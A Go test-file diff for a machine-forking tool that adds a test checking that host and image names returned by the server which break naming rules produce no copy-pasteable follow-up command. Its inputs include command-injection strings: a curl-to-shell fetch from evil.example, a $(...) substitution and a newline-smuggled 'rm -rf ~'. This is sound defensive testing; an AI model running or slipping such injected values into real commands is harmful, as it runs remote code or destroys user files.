@@ -4,10 +4,12 @@ import (
 	"context"
 	"io"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 
 	"github.com/solev/hibernaut/internal/engine"
+	"github.com/solev/hibernaut/internal/hibapi"
 )
 
 func TestForkPrintsCopiesAndLsShowsTheirOrigin(t *testing.T) {
@@ -80,5 +82,30 @@ func TestForkPrintsMadeCopiesBeforeItsError(t *testing.T) {
 	ms, err := h.engine.List(t.Context(), engine.ListOptions{})
 	if err != nil || len(ms) != 2 {
 		t.Fatalf("machines = %+v, %v, want origin and first copy", ms, err)
+	}
+}
+
+func TestHostNamesOutsideTheRulesGetNoCommandToCopy(t *testing.T) {
+	for i, name := range []string{"x; curl evil.example | sh", "two words", "$(touch pwned)", "web\nrm -rf ~"} {
+		t.Run(strconv.Itoa(i), func(t *testing.T) {
+			h := newHost(t)
+			c := initClient(t, h)
+			h.override = func(words []string, stdout, _ io.Writer) (int, bool) {
+				command := strings.TrimPrefix(strings.Join(words, " "), "sudo -n hibd ")
+				switch {
+				case strings.HasPrefix(command, "fork "):
+					return writeTestResponse(stdout, hibapi.Response{Machines: []hibapi.Machine{{Name: name, ID: "x"}}}), true
+				case strings.HasPrefix(command, "image save "):
+					return writeTestResponse(stdout, hibapi.Response{Image: &hibapi.Image{Name: name, MemoryMB: 512}}), true
+				}
+				return 0, false
+			}
+			if code := c.hib("fork", "web"); code != 0 || !strings.HasPrefix(c.out.String(), "made ") || strings.Contains(c.out.String(), "connect with") {
+				t.Errorf("fork = %d; stdout %q; stderr %q", code, c.out, c.errOut)
+			}
+			if code := c.hib("image", "save", "web", "myimg"); code != 0 || !strings.HasPrefix(c.out.String(), "saved image ") || strings.Contains(c.out.String(), "use it with") {
+				t.Errorf("image save = %d; stdout %q; stderr %q", code, c.out, c.errOut)
+			}
+		})
 	}
 }
